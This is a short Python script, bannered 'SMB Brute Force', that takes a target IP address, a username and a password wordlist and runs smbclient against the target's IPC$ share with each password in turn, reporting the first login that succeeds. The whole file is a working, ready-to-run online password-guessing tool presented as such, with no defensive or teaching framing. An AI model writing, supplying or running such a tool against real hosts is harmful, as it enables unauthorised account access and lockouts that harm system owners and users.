import subprocess

banner = r"""


 ________  _____ ______   ________          ________  ________  ___  ___  _________  _______           ________ ________  ________  ________  _______      
|\   ____\|\   _ \  _   \|\   __  \        |\   __  \|\   __  \|\  \|\  \|\___   ___\\  ___ \         |\  _____\\   __  \|\   __  \|\   ____\|\  ___ \     
\ \  \___|\ \  \\\__\ \  \ \  \|\ /_       \ \  \|\ /\ \  \|\  \ \  \\\  \|___ \  \_\ \   __/|        \ \  \__/\ \  \|\  \ \  \|\  \ \  \___|\ \   __/|    
 \ \_____  \ \  \\|__| \  \ \   __  \       \ \   __  \ \   _  _\ \  \\\  \   \ \  \ \ \  \_|/__       \ \   __\\ \  \\\  \ \   _  _\ \  \    \ \  \_|/__  
  \|____|\  \ \  \    \ \  \ \  \|\  \       \ \  \|\  \ \  \\  \\ \  \\\  \   \ \  \ \ \  \_|\ \       \ \  \_| \ \  \\\  \ \  \\  \\ \  \____\ \  \_|\ \ 
    ____\_\  \ \__\    \ \__\ \_______\       \ \_______\ \__\\ _\\ \_______\   \ \__\ \ \_______\       \ \__\   \ \_______\ \__\\ _\\ \_______\ \_______\
   |\_________\|__|     \|__|\|_______|        \|_______|\|__|\|__|\|_______|    \|__|  \|_______|        \|__|    \|_______|\|__|\|__|\|_______|\|_______|
   \|_________|                                                                                                                                            
                                                                                                                                                           
                                                                                                                                                           


"""

def smb_bruteforce(ip, username, wordlist_path):
    print(">>> SMB Bruteforce <<<\n")
    count = 1
    
    try:
        with open(wordlist_path, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Password list file not found: {wordlist_path}")
        return

    for password in passwords:
        print(f"[ATTEMPT {count}] [{password}]")
        # smbclient command tries to list shares (or just connect)
        # -L = list shares, -N = no password prompt (ignore), -U username%password
        # We run smbclient with a timeout (optional)
        command = [
            'smbclient', f'//{ip}/IPC$',  # IPC$ is a standard share for authentication testing
            '-U', f'{username}%{password}',
            '-c', 'exit'  # Just connect and immediately disconnect
        ]
        
        try:
            # Run smbclient and capture output; timeout=5 seconds to avoid hangs
            result = subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
            if result.returncode == 0:
                print(f"\nPassword Found! '{password}'")
                return
        except subprocess.TimeoutExpired:
            print("Connection timed out.")
        
        count += 1
    
    print("\nPassword not Found :(")

def main():
    ip = input("Enter IP Address: ").strip()
    username = input("Enter Username: ").strip()
    wordlist_path = input("Enter Password List: ").strip()
    smb_bruteforce(ip, username, wordlist_path)
    input("Press Enter to exit...")

if __name__ == "__main__":
    main()
